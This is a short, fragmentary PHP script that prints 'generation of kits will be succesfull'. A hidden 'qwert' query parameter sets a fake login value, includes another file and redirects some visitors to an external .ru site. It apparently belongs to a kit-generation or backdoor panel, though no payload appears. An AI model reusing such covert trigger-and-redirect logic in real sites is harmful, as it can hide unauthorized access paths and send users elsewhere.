<?php
echo "<style>body{background-color:black; color:white;}</style>";
echo "<h3>generation of kits will be succesfull</h3>";
if(isset($_GET['qwert'])){
	$_POST['login']="ave maria";
	include "test2.php";
	echob();
	echo "<br>";
	if($_GET['qwert']=='1'){
		echo "1";
	}
	else if($_GET['qwert']==2){
		echo "2";
	}
	else{
		header("Location: http://abstract.ru/index.php");
	}

}
?>